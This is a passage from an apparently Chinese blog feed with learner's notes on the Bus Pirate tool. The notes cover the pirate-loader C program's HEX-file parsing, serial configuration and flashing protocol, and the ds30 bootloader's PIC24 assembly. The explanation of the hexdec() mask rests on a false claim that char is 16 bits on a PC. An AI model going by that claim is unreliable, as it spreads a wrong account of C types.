puts(&quot;ERROR&quot;);        return -1;    }    // 完成写之后，对串口进行读    res = readWithTimeout(fd, response, 1, 5);    if( res != 1 ) {        puts(&quot;ERROR&quot;);        return -1;    } else if ( response[0] != BOOTLOADER_OK ) {        // 串口返回的状态字，可以由PC解析发现什么问题        printf(&quot;ERROR [%02x]\n&quot;, response[0]);        return -1;    } else {        return 0;    }}</code></pre><p>这里的前面的写操作所对应的，第三个参数是写入长度，可是这里加上的便宜，还涉及到了Cmd的内容</p><pre><code>res = write(fd, command, HEADER_LENGTH + command[LENGTH_OFFSET]);</code></pre><h3 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h3><p>这个算是关键函数，实现了对我们的固件的hex文件的读取</p><p>函数原型如下：</p><pre><code>int readHEX(const char* file, uint8* bout, unsigned long max_length, uint8* pages_used)</code></pre><p>篇幅很长这里对函数体的重点：</p><pre><code>//////////////////////////////////static const uint32 HEX_DATA_OFFSET = 4;uint8* data = (linebin + HEX_DATA_OFFSET);char  line[512] = {0}; // 行指针组char  *pc;    // 字符指针char  *pline = line + 1;    // 行指针///////////////////////////////////// 这里的feof是标准库哦，学习了// 加载一行的内容while( !feof(fp) &amp;&amp; fgets(line, sizeof(line) - 1, fp) )    {        // 行号，看得出来        line_no++;        // hex文件格式，        if( line[0] != &apos;:&apos; ) {            break;        }        // pline 是行内容指针        res = strlen(pline);        // 当前的行地址，加上行长度，减一，        // 也就是行末。        pc  = pline + res - 1;        // 注意， 这里的 &lt;= &apos; &apos;         // 一开始没有理解，发现空格的ascii是32，所以这里是去掉特殊字符，把他们直接给置0        while( pc &gt; pline &amp;&amp; *pc &lt;= &apos; &apos; ) {            *pc-- = 0;    // 这里写0干嘛呢            res--;        }        // res 是当前行的字符剩余数，一下的情况都是非法的。        if( res &amp; 0x01 || res &gt; 512 || res &lt; 10) {            fprintf(stderr, &quot;Incorrect number of characters on line %d:%d\n&quot;, line_no, res);            return -1;        }        // CRC 校验        hex_crc = 0;                    for( pc = pline, i = 0; i&lt;res; i+=2, pc+=2 ) {            linebin[i &gt;&gt; 1] = hexdec(pc);            hex_crc += linebin[i &gt;&gt; 1];        }        binlen = res / 2;        if( hex_crc != 0 )            ... // checksum失败                        ...                    if( binlen - (1 + 2 + 1 + hex_len + 1) != 0 )                ... // 字节数失败        if( hex_type == 0x00 )        {            f_addr  = (hex_base_addr | (hex_addr)) / 2; //PCU            if( hex_len % 4 ) {                // 数据没对齐 4字节                fprintf(stderr, &quot;Misaligned data, line %d\n&quot;, line_no);                return -1;            } else if( f_addr &gt;= PIC_FLASHSIZE ) {                // 编程地址超出PIC的flash地址                fprintf(stderr, &quot;Current record address is higher than maximum allowed, line %d\n&quot;, line_no);                return -1;            }            hex_words = hex_len  / 4;            o_addr  = (f_addr / 2) * PIC_WORD_SIZE; //BYTES            for( i=0; i&lt;hex_words; i++)            {                bout[o_addr + 0] = data[(i*4) + 2];                bout[o_addr + 1] = data[(i*4) + 0];                bout[o_addr + 2] = data[(i*4) + 1];                pages_used[ (o_addr / PIC_PAGE_SIZE) ] = 1;                o_addr    += PIC_WORD_SIZE;                num_words ++;            }        } else if ( hex_type == 0x04 &amp;&amp; hex_len == 2) {            hex_base_addr = (linebin[4] &lt;&lt; 24) | (linebin[5] &lt;&lt; 16);        } else if ( hex_type == 0x01 ) {            break; //EOF        } else {            fprintf(stderr, &quot;Unsupported record type %02x, line %d\n&quot;, hex_type, line_no);            return -1;        }    }    fclose(fp);    return num_words;}</code></pre><hr><p>从文件的 <strong>循环行读取</strong> 到 <strong>正则</strong> ，校验， 缓冲区偏移存储，记录值类型。完成了一个hex的读取的过程。</p><p>先是在循环中按行读取，根据前面的 <strong>hex_type</strong> 判断当前的读取的数据类型，当前行的实际字节数 <strong>hex_len</strong> 和地址，<code>f_addr  = (hex_base_addr | (hex_addr)) / 2</code> 这一步，确定了，在flash的真实的地址映射，</p><hr><pre><code>!feof(FILE *stream)while( !feof(fp) &amp;&amp; fgets(line, sizeof(line) - 1, fp) )</code></pre><p>这个循环读取的结构， 很棒，学习了</p><h3 id="发送固件"><a href="#发送固件" class="headerlink" title="发送固件"></a>发送固件</h3><pre><code>int sendFirmware(int fd, uint8* data, uint8* pages_used){    uint32 u_addr;    uint32 page  = 0;    uint32 done  = 0;    uint32 row   = 0;    uint8  command[256] = {0};    for( page=0; page&lt;PIC_NUM_PAGES; page++)    {        u_addr = page * ( PIC_NUM_WORDS_IN_ROW * 2 * PIC_NUM_ROWS_IN_PAGE );        if( pages_used[page] != 1 ) {            if( g_verbose &amp;&amp; u_addr &lt; PIC_FLASHSIZE) {                fprintf(stdout, &quot;Skipping page %ld [ %06lx ], not used\n&quot;, page, u_addr);            }            continue;        }        if( u_addr &gt;= PIC_FLASHSIZE ) {            fprintf(stderr, &quot;Address out of flash\n&quot;);            return -1;        }        //erase page        command[0] = (u_addr &amp; 0x00FF0000) &gt;&gt; 16;        command[1] = (u_addr &amp; 0x0000FF00) &gt;&gt;  8;        command[2] = (u_addr &amp; 0x000000FF) &gt;&gt;  0;        command[COMMAND_OFFSET] = 0x01; //erase command        command[LENGTH_OFFSET ] = 0x01; //1 byte, CRC        command[PAYLOAD_OFFSET] = makeCrc(command, 5);        if( g_verbose ) {            dumpHex(command, HEADER_LENGTH + command[LENGTH_OFFSET]);        }        printf(&quot;Erasing page %ld, %04lx...&quot;, page, u_addr);        if( g_simulate == 0 &amp;&amp; sendCommandAndWaitForResponse(fd, command) &lt; 0 ) {            return -1;        }        puts(&quot;OK&quot;);        //write 8 rows        for( row = 0; row &lt; PIC_NUM_ROWS_IN_PAGE; row ++, u_addr += (PIC_NUM_WORDS_IN_ROW * 2))        {            command[0] = (u_addr &amp; 0x00FF0000) &gt;&gt; 16;            command[1] = (u_addr &amp; 0x0000FF00) &gt;&gt;  8;            command[2] = (u_addr &amp; 0x000000FF) &gt;&gt;  0;            command[COMMAND_OFFSET] = 0x02; //write command            command[LENGTH_OFFSET ] = PIC_ROW_SIZE + 0x01; //DATA_LENGTH + CRC            memcpy(&amp;command[PAYLOAD_OFFSET], &amp;data[PIC_ROW_ADDR(page, row)], PIC_ROW_SIZE);            command[PAYLOAD_OFFSET + PIC_ROW_SIZE] = makeCrc(command, HEADER_LENGTH + PIC_ROW_SIZE);            printf(&quot;Writing page %ld row %ld, %04lx...&quot;, page, row + page*PIC_NUM_ROWS_IN_PAGE, u_addr);            if( g_simulate == 0 &amp;&amp; sendCommandAndWaitForResponse(fd, command) &lt; 0 ) {                return -1;            }            puts(&quot;OK&quot;);            sleep(0);            if( g_verbose ) {                dumpHex(command, HEADER_LENGTH + command[LENGTH_OFFSET]);            }            done += PIC_ROW_SIZE;        }    }    return done;}</code></pre><h3 id="串口配置"><a href="#串口配置" class="headerlink" title="串口配置"></a>串口配置</h3><p>打开串口之后，对串口的参数进行配置， 这部分代码可以收藏，重用机会是挺多的。</p><pre><code>int configurePort(int fd, unsigned long baudrate){#ifdef WIN32    // 系统宏    DCB dcb = {0};    HANDLE hCom = (HANDLE)fd;    dcb.DCBlength = sizeof(dcb);    dcb.BaudRate = baudrate;    dcb.ByteSize = 8;    dcb.Parity = NOPARITY;    dcb.StopBits = ONESTOPBIT;    if( !SetCommState(hCom, &amp;dcb) ){        return -1;    }    return (int)hCom;#else    struct termios g_new_tio;    memset(&amp;g_new_tio, 0x00 , sizeof(g_new_tio));    cfmakeraw(&amp;g_new_tio);    g_new_tio.c_cflag |=  (CS8 | CLOCAL | CREAD);    g_new_tio.c_cflag &amp;= ~(PARENB | CSTOPB | CSIZE);    g_new_tio.c_oflag = 0;    g_new_tio.c_lflag = 0;    g_new_tio.c_cc[VTIME] = 0;    g_new_tio.c_cc[VMIN] = 1;    cfsetispeed (&amp;g_new_tio, baudrate);    cfsetospeed (&amp;g_new_tio, baudrate);    tcflush(fd, TCIOFLUSH);    return tcsetattr(fd, TCSANOW, &amp;g_new_tio);#endif}</code></pre><h3 id="命令行解析"><a href="#命令行解析" class="headerlink" title="命令行解析"></a>命令行解析</h3><p>这里一样的是，一个挺实用的部分。也算是当做代码片收藏了</p><pre><code>int parseCommandLine(int argc, const char** argv){    int i = 0;    // 从 1 开始解析参数，后面疯狂进行对比    for(i=1; i&lt;argc; i++)    {        if( !strncmp(argv[i], &quot;--hex=&quot;, 6) ) {            g_hexfile_path = argv[i] + 6;        } else if ( !strncmp(argv[i], &quot;--dev=&quot;, 6) ) {            g_device_path = argv[i] + 6;        } else if ( !strcmp(argv[i], &quot;--verbose&quot;) ) {            g_verbose = 1;        } else if ( !strcmp(argv[i], &quot;--hello&quot;) ) {            g_hello_only = 1;        } else if ( !strcmp(argv[i], &quot;--simulate&quot;) ) {            g_simulate = 1;        } else if ( !strcmp(argv[i], &quot;--help&quot;) ) {            argc = 1; //that&apos;s not pretty, but it works :)            break;        } else {        // 没有找到对应的参数            fprintf(stderr, &quot;Unknown parameter %s, please use pirate-loader --help for usage\n&quot;, argv[i]);            return -1;        }    }    if( argc == 1 )    {        //print usage        puts(&quot;pirate-loader usage:\n&quot;);        puts(&quot; ./pirate-loader --dev=/path/to/device --hello&quot;);        puts(&quot; ./pirate-loader --dev=/path/to/device --hex=/path/to/hexfile.hex [ --verbose ]&quot;);        puts(&quot; ./pirate-loader --simulate --hex=/path/to/hexfile.hex [ --verbose ]&quot;);        puts(&quot;&quot;);        return 0;    }    return 1;}</code></pre><p>虽说这里是很实用的 代码，不过感觉蠢蠢的，通过代码的遍历比较，感觉有什么不对，进行一个全局的标志位的操作。</p><p>不过也是很巧妙：</p><pre><code>strncmp(argv[i], &quot;--hex=&quot;, 6)        g_hexfile_path = argv[i] + 6;strncmp(argv[i], &quot;--dev=&quot;, 6)g_device_path = argv[i] + 6;</code></pre><p>突然一想，发现这个没有空格啊。</p><p>没错，是没有空格的，参数和这个输入的本身是没有空格的，使用的是 <code>=</code> 进行的连接，所以在后面使用 <code>= argv[i] + 6;</code> 这种形式，就可以直接偏移到我们的输入内容，妙哉</p><h3 id="辅助函数"><a href="#辅助函数" class="headerlink" title="辅助函数"></a>辅助函数</h3><p>这部分就是一些辅助函数，进行字符转换之类的东西，虽说简单，但是写的精妙</p><pre><code>// 这个函数，把十六进制字符串，转为整型值unsigned char hexdec(const char* pc){    unsigned char temp;    // 从ASCII从大到小，依次来    if(pc[0]&gt;=&apos;a&apos;){        temp=pc[0]-&apos;a&apos;+10;    }else if(pc[0] &gt;= &apos;A&apos;){        temp=pc[0]-&apos;A&apos;+10;            }else{        temp=pc[0] - &apos;0&apos;;    }    // 第一个字符的整型值放在这个Char的高位    // 别忘了，Char可是8位的    temp=temp&lt;&lt;4;    // 这里统一使用 |= 直接位或，放在低位就好    if(pc[1]&gt;=&apos;a&apos;){        temp|=pc[1]-&apos;a&apos;+10;    }else if(pc[1] &gt;= &apos;A&apos;){        temp|=pc[1]-&apos;A&apos;+10;            }else{        temp|=pc[1] - &apos;0&apos;;    }    // 这里再做一次位与，一眼看去没怎么搞懂这个的作用    // 这里就十分有趣了，后面讲嘻嘻    return(temp &amp; 0x0FF);    // 这里的一句话就是很强了，直接使用条件表达式        //return (((pc[0] &gt;= &apos;A&apos;) ? ( pc[0] - &apos;A&apos; + 10 ) : ( pc[0] - &apos;0&apos; ) ) &lt;&lt; 4 |     //        ((pc[1] &gt;= &apos;A&apos;) ? ( pc[1] - &apos;A&apos; + 10 ) : ( pc[1] - &apos;0&apos; ) )) &amp; 0x0FF;}</code></pre><hr><p>这里比较好玩的一点，就是这个 &amp;0xff 看上去的确是没啥作用呀。实际上，这里就有了符号位这样的一个东西.</p><p>记住，我们的输入的数据只是有两位十进制，对吧，所以分别在b0~b3，和b4~b7，所以说，我们使用了这个char的8位数据，不过事实上，这里的问题是什么？？？</p><p>在PC上面呀，char是16位的。最高位的数据我们是没有用到的的。这里存在的符号位，当然会影响我们的值得真实大小，所以使用 0&amp;ff 实际上应该写成 &amp; 0x00ff。这样前面用不到的地方全部清零，就没有了符号位的影响</p><ul><li><p><span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vdGhpbmstaW4tamF2YS9wLzU1MjczODkuaHRtbA==" title="https://www.cnblogs.com/think-in-java/p/5527389.html">byte为什么要与上0xff<i class="fa fa-external-link"></i></span></p></li><li><p>  // 打印缓冲区内容，没啥好讲的<br>  void dumpHex(uint8* buf, uint32 len)<br>  {</p><pre><code>uint32 i=0;for(i=0; i&lt;len; i++){    printf(&quot;%02X &quot;, buf[i]);}putchar(&apos;\n&apos;);</code></pre><p>  }</p><p>  // CRC 的实现过程<br>  uint8 makeCrc(uint8* buf, uint32 len)<br>  {</p><pre><code>uint8 crc = 0, i = 0;for(i=0; i&lt;len; i++){    crc -= *buf++;}return crc;</code></pre><p>  }<br>CRC 的在这里的实现过程，简单的讲一句话，把每字节的值逐字节进行运算。最后得到一个字节的值，这样只能使得一定可能的查错。要是两个值刚好一个加一，一个减一，没办法了</p></li></ul><hr><pre><code>int openPort(const char* dev, unsigned long flags){    return open(dev, O_RDWR | O_NOCTTY | O_NDELAY | flags);}</code></pre><h3 id="主函数入口"><a href="#主函数入口" class="headerlink" title="主函数入口"></a>主函数入口</h3><p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0J1c1BpcmF0ZS9CdXNfUGlyYXRlL2Jsb2IvNjBlOGNiMDAyN2RhMWIyMzU5ZjA1MmRjZjUyMzhiMWUyNWEwYmNhMC9Cb290bG9hZGVycy9CUHYzLWJvb3Rsb2FkZXIvcGlyYXRlLWxvYWRlci9waXJhdGUtbG9hZGVyLmMjTDYyMw==" title="https://github.com/BusPirate/Bus_Pirate/blob/60e8cb0027da1b2359f052dcf5238b1e25a0bca0/Bootloaders/BPv3-bootloader/pirate-loader/pirate-loader.c#L623"><code>int main (int argc, const char** argv)</code><i class="fa fa-external-link"></i></span></p><p>都是逻辑代码，所以这里只是贴出部分的有趣的代码</p><pre><code>// 256k 的优雅的分配bin_buff = (uint8*)malloc(256 &lt;&lt; 10); //256kBif( !bin_buff ) {    fprintf(stderr, &quot;Could not allocate 256kB buffer\n&quot;);        goto Error;}memset(bin_buff, 0xFFFFFFFF, (256 &lt;&lt; 10));</code></pre><hr><p><strong>设备握手</strong></p><p>这里的握手过程，典型的业务代码吧。发送握手，接收，之后判断 XD</p><pre><code>#define BOOTLOADER_HELLO_STR &quot;\xC1&quot;//send HELLOres = write(dev_fd, BOOTLOADER_HELLO_STR, 1);res = readWithTimeout(dev_fd, buffer, 4, 3);if( res != 4 || buffer[3] != BOOTLOADER_OK ) {    puts(&quot;ERROR&quot;);    fprintf(stderr, &quot;No reply from the bootloader, or invalid reply received: %d\n&quot;, res);    fprintf(stderr, &quot;Please make sure that PGND and PGC are connected, replug the device and try again\n&quot;);    goto Error;}puts(&quot;OK\n&quot;); //extra LF for spacingprintf(&quot;Device ID: %s [%02x]\n&quot;, (buffer[0] == 0xD4) ? &quot;PIC24FJ64GA002&quot; : &quot;UNKNOWN&quot;, buffer[0]);printf(&quot;Bootloader version: %d,%02d\n&quot;, buffer[1], buffer[2]);if( buffer[0] != 0xD4 ) {    fprintf(stderr, &quot;Unsupported device (%02x:UNKNOWN), only 0xD4 PIC24FJ64GA002 is supported\n&quot;, buffer[0]);    goto Error;}</code></pre><hr><p><strong>错误处理</strong></p><p>很多地方到处宣扬着 goto 有害论.实际上，在C这个异常处理尚不健全的情况下。使用Goto 实现异常处理的方法，是十分OK的。</p><p>源程序的后面，实现了两个异常处理的标号：</p><pre><code>Finished:    if( bin_buff ) {         free( bin_buff );    }    close(dev_fd);    return 0;Error:    if( bin_buff ) {        free( bin_buff );    }    if( dev_fd &gt;= 0 ) {        close(dev_fd);    }    return -1;</code></pre><h2 id="后"><a href="#后" class="headerlink" title="后"></a>后</h2><p>熟读代码三千行，不会编程也会背。2333</p>]]></content:encoded>
      
      <comments>https://www.diglp.xyz/2018/06/25/HackWare_PC_loader/#disqus_thread</comments>
    </item>
    
    <item>
      <title>HackWare BootLoader 原理</title>
      <link>https://www.diglp.xyz/2018/06/21/HackWare_Booloader/</link>
      <guid>https://www.diglp.xyz/2018/06/21/HackWare_Booloader/</guid>
      <pubDate>Wed, 20 Jun 2018 16:00:00 GMT</pubDate>
      <description>
      
        
        
          
          
            &lt;h2 id=&quot;前&quot;&gt;&lt;a href=&quot;#前&quot; class=&quot;headerlink&quot; title=&quot;前&quot;&gt;&lt;/a&gt;前&lt;/h2&gt;&lt;p&gt;最近, follow 一个开源项目, BusPirate ,总线海盗,一个很棒的超多功能集一身的一个 tool. 对其中的 bootloader
          
        
      
      </description>
      
      <content:encoded><![CDATA[<h2 id="前"><a href="#前" class="headerlink" title="前"></a>前</h2><p>最近, follow 一个开源项目, BusPirate ,总线海盗,一个很棒的超多功能集一身的一个 tool. 对其中的 bootloader 印象深刻, 虽然不是第一次知道这东西, 这次也是来了兴致. 学习一下.</p><hr><ul><li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0J1c1BpcmF0ZS9CdXNfUGlyYXRl" title="https://github.com/BusPirate/Bus_Pirate">BusPirate Github<i class="fa fa-external-link"></i></span></li><li><span class="exturl" data-url="aHR0cDovL2Rhbmdlcm91c3Byb3RvdHlwZXMuY29tL2RvY3MvQnVzX1BpcmF0ZS96aC1oYW5zIy43RV8uRTguODcuQUEuRTYuQTMuODA=" title="http://dangerousprototypes.com/docs/Bus_Pirate/zh-hans#.7E_.E8.87.AA.E6.A3.80">BusPirate Offical Website<i class="fa fa-external-link"></i></span></li></ul><h2 id="What"><a href="#What" class="headerlink" title="What"></a>What</h2><p>先看看<span class="exturl" data-url="aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS9Cb290TG9hZGVyLzg3MzM1MjA=" title="https://baike.baidu.com/item/BootLoader/8733520">词条<i class="fa fa-external-link"></i></span>的定义:</p><blockquote><p>在嵌入式操作系统中，BootLoader是在操作系统内核运行之前运行。可以初始化硬件设备、建立内存空间映射图，从而将系统的软硬件环境带到一个合适状态，以便为最终调用操作系统内核准备好正确的环境。在嵌入式系统中，通常并没有像BIOS那样的固件程序（注，有的嵌入式CPU也会内嵌一段短小的启动程序），因此整个系统的加载启动任务就完全由BootLoader来完成。在一个基于ARM7TDMI core的嵌入式系统中，系统在上电或复位时通常都从地址0x00000000处开始执行，而在这个地址处安排的通常就是系统的BootLoader程序。</p></blockquote><p>实际上我们简单讲, 就是在嵌入式设备中, 给我们即将执行的程序(系统),     提供运行初始化环境的东西, 在初始化完成之后, 直接进行 <strong>jmp</strong> 使得<strong>PC</strong> 到目标程序空间, 永不返回(一般性).</p><p>这里,就是以这个项目提供的bootloader源码进行.</p><h2 id="How"><a href="#How" class="headerlink" title="How"></a>How</h2><p>文件定位:    <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0J1c1BpcmF0ZS9CdXNfUGlyYXRlL2Jsb2IvbWFzdGVyL0Jvb3Rsb2FkZXJzL0JQdjMtYm9vdGxvYWRlci9maXJtd2FyZS12NC41L2RzMzBsb2FkZXIucw==" title="https://github.com/BusPirate/Bus_Pirate/blob/master/Bootloaders/BPv3-bootloader/firmware-v4.5/ds30loader.s">https://github.com<i class="fa fa-external-link"></i></span></p><p>本想着可能是使用 C 写的, 发现除了配置文件, 只有 .s 汇编了,</p><hr><p>文件前段,是以下内容注释:</p><blockquote><p>ds30 Loader is free software: you can redistribute it and/or modify<br>;<br>it under the terms of the GNU General Public License as published by the Free Software Foundation.</p></blockquote><p>这个 bootloader 应该是,第三方所开发的框架, 直接对其进行修改就好</p><h3 id="静态初始化"><a href="#静态初始化" class="headerlink" title="静态初始化"></a>静态初始化</h3><pre><code>;------------------------------------------------------------------------------; Register usage;------------------------------------------------------------------------------        ;.equ    MIXED,        W0        ;immediate        .equ    DOERASE,    W1        ;flag indicated erase should be done before next write        .equ    WBUFPTR,    W2        ;buffer pointer        .equ    WCNT,        W3        ;loop counter        .equ    WADDR2,        W4        ;memory pointer        .equ    WADDR,        W5        ;memory pointer                .equ    PPSTEMP1,    W6        ;used to restore pps register        .equ    PPSTEMP2,    W7        ;used to restore pps register        .equ    WFWJUMP,    W8        ;did we jump here from the firmware?        ;.equ    UNUSED,        W9        ;        .equ    WDEL1,        W10        ;delay outer        .equ    WDEL2,        W11        ;delay inner        ;.equ    UNUSED,        W12        ;        .equ    WCMD,        W13        ;command        .equ     WCRC,         W14        ;checksum        .equ    WSTPTR,     W15     ;stack pointer</code></pre><p>这里的一段代码来自文件首,<code>,equ</code>的伪指令也说明了 这里是,寄存器的宏定义,给不同寄存器,起别名, 保证了程序易读性.</p><p>下面导入, 单片机设置. 和我们平时使用的 <code>#include &lt;reg52.h&gt;</code> 类似</p><pre><code>;------------------------------------------------------------------------------; Includes;------------------------------------------------------------------------------.include &quot;settings.inc&quot; </code></pre><hr><p>在这段代码的注释部分已经说明, 这里是 constants的 ,不需要进行修改. 主要内容主要是, 对于 将会使用的常量的宏. 内容有 字符, 延时, 串口波特率, 页大小, 和 STARTADDR . 其原文的注释,对这些 静态符号也有很好的说明</p><pre><code>;------------------------------------------------------------------------------; Constants, don&apos;t change;------------------------------------------------------------------------------        .equ    VERMAJ,        1                                        /*firmware version major*/        .equ    VERMIN,        0                                        /*fimrware version minor*/        .equ    VERREV,        2                                        /*firmware version revision*/        .equ     HELLO,         0xC1                .equ     OK,         &apos;K&apos;                                        /*erase/write ok*/        .equ     CHECKSUMERR,&apos;N&apos;                                        /*checksum error*/        .equ    VERFAIL,    &apos;V&apos;                                        /*verification failed*/        .equ       BLPROT,     &apos;P&apos;                                      /*bl protection tripped*/</code></pre><p>​<br>            .equ    BLDELAY,    ( BLTIME <em> (FCY / 1000) / (65536 </em> 7) )    /<em>delay berfore user application is loaded</em>/<br>            ;.equ    UARTBR,        ( (((FCY / BAUDRATE) / 8) - 1) / 2 )    /<em>baudrate</em>/<br>            /<em> issue 11 in errata for A3, optimal value causes reception to fail </em>/<br>            /<em> autocalculate: 0x21, &lt;2.5% error    </em>/<br>            /<em> working: 0x22, &lt;3% error, same as main firmware </em>/<br>            .equ     UARTBR,     0x22;((FCY/(4<em>BAUDRATE))-1)<br>            .equ    PAGESIZE,    512                                        /</em>words<em>/<br>            .equ    ROWSIZE,    64                                        /</em>words<em>/<br>            ; 这个 指令是注释掉了的,<br>    ;        .equ    STARTADDR,    ( FLASHSIZE - 2</em>(PAGESIZE <em> 2) )         /</em>place bootloader in 2nd last program page<em>/<br>            .equ    STARTADDR,    ( FLASHSIZE - (2</em> (PAGESIZE)) )         /<em>place bootloader in last program page</em>/<br>            .equ    BLCHECKST,  ( STARTADDR - (ROWSIZE) )            /<em>precalculate the first row write position that would overwrite the bootloader</em>/<br>            .equ     BLVERSION,     0x0405                                 ;bootloader version for Bus Pirate firmware (located at last instruction before flash config words)</p><p>对 一些 宏的 定义值进行合法性检测.</p><pre><code>;------------------------------------------------------------------------------; Validate user settings;------------------------------------------------------------------------------        ; Internal cycle clock        .if FCY &gt; 16000000            .error &quot;Fcy specified is out of range&quot;        .endif        ; Baudrate error        .equ REALBR,    ( FCY / (4 * (UARTBR+1)) )        .equ BAUDERR,    ( (1000 * ( BAUDRATE - REALBR)) / BAUDRATE )        .if ( BAUDERR &gt; 30) || (BAUDERR &lt; -30 )            .error &quot;Baudrate error is more than 3%. Remove this check or try another baudrate and/or clockspeed.&quot;        .endif         .if BLDELAY&lt;1           .error &quot;Bootloader delay is 0&quot;.endif ...</code></pre><p>这里,在数据段分配空间 , 存放固件签名地址</p><pre><code>;------------------------------------------------------------------------------; Uninitialized variables in data memory;------------------------------------------------------------------------------    .bssbuffer:    .space ( ROWSIZE * 3 + 1/*checksum*/ )     .equ FIRMWARE_SIGNATURE_LOW, 0x3141    .equ FIRMWARE_SIGNATURE_HIGH, 0x5926    .global skip_pgc_pgd_check    .global firmware_signature    .section *, bss, address(0x27FA)skip_pgc_pgd_check: .space 2firmware_signature: .space 4</code></pre><h3 id="签名校验"><a href="#签名校验" class="headerlink" title="签名校验"></a>签名校验</h3><p>在文件的前面, 有声明一个全局符号</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">;------------------------------------------------------------------------------</span><br><span class="line">; Global declarations</span><br><span class="line">;------------------------------------------------------------------------------</span><br><span class="line">        .global __reset          ;the label for the first line of code, needed by the linker script</span><br></pre></td></tr></table></figure><p>由符号可以直接看出, 是一个复位向量, 下面是标号内容, 也就是我们一上电会执行的东西</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">;------------------------------------------------------------------------------</span><br><span class="line">; Reset vector</span><br><span class="line">;------------------------------------------------------------------------------</span><br><span class="line">.section *, code, address(STARTADDR); 指定段 及段偏移</span><br><span class="line">__reset:mov #__SP_init, WSTPTR; 初始化栈指针</span><br></pre></td></tr></table></figure><p>​<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">;------------------------------------------------------------------------------</span><br><span class="line">; User specific entry code go here, see also user exit code section at end of file</span><br><span class="line">;------------------------------------------------------------------------------</span><br><span class="line">bclr OSCCON, #SOSCEN</span><br><span class="line">bclr CLKDIV, #RCDIV0 ;set clock divider to 0</span><br><span class="line"></span><br><span class="line">waitPLL:btss OSCCON, #LOCK; 锁相环初始化</span><br><span class="line">bra waitPLL ;wait for the PLL to lock</span><br><span class="line"></span><br><span class="line">mov #0xFFFF, W0 ;all pins to digital</span><br><span class="line">mov W0, AD1PCFG; IO初始化</span><br><span class="line"></span><br><span class="line">; Make sure the firmware has been started at least once.</span><br><span class="line">;</span><br><span class="line">; If the firmware signature is found in memory then it is</span><br><span class="line">; extremely plausible that skip_pgc_pgd_check has been</span><br><span class="line">; initialised to the correct value.</span><br><span class="line"></span><br><span class="line">; 读取片内地址, 与硬编码签名进行比较</span><br><span class="line">mov #firmware_signature, W0</span><br><span class="line">mov [W0++], W1; 这里读取高字节</span><br><span class="line"></span><br><span class="line">mov #FIRMWARE_SIGNATURE_HIGH, W2; 加载 正确签名高字节</span><br><span class="line">cp W1, W2; 比较</span><br><span class="line">bra nz, jumper_test; 不等跳转</span><br><span class="line"></span><br><span class="line">mov [W0], W1</span><br><span class="line">mov #FIRMWARE_SIGNATURE_LOW, W2; 加载 正确签名低字节</span><br><span class="line">cp W1, W2</span><br><span class="line">bra nz, jumper_test; 不等跳转</span><br><span class="line"></span><br><span class="line">mov #skip_pgc_pgd_check, W0; 加载标志位地址</span><br><span class="line">cp0.b [W0]</span><br><span class="line">clr.b [W0]       ; should not change flags</span><br><span class="line">; 上面的 PIC 汇编,没看懂, 查了查没有 .b 这样的语法???</span><br><span class="line">; 理应是把这个地址的 内容复位吧.</span><br><span class="line"></span><br><span class="line">bra nz, setup; 开始启动配置</span><br></pre></td></tr></table></figure></p><p>上面的这段代码, 实际上应该是对,当前的单片机内是否有 <strong>有效的固件</strong> 进行检测. 固件包含签名, 有签名就是有固件.</p><h3 id="跳线检测"><a href="#跳线检测" class="headerlink" title="跳线检测"></a>跳线检测</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">jumper_test:</span><br><span class="line">    </span><br><span class="line">mov #skip_pgc_pgd_check, W0; 老规矩, 加载标志位的地址</span><br><span class="line">clr.b [W0]; 清空内容</span><br><span class="line">    </span><br><span class="line">;jumper check test</span><br><span class="line">;setup the jumper check</span><br><span class="line">;enable input on PGx</span><br><span class="line"></span><br><span class="line">; 这里是引脚配置部分,使得拥有电平检测的功能</span><br><span class="line">bclr LATB, #LATB1 ;rb1 low</span><br><span class="line">bset TRISB, #TRISB1 ;rb1 input</span><br><span class="line">bset CNPU1, #CN5PUE ;enable pullups on PGC/CN5/RB1</span><br><span class="line">;ground/output on PGx</span><br><span class="line">bclr LATB, #RB0 ;rb0 low</span><br><span class="line">bclr TRISB, #TRISB0 ;rb0 output</span><br><span class="line"></span><br><span 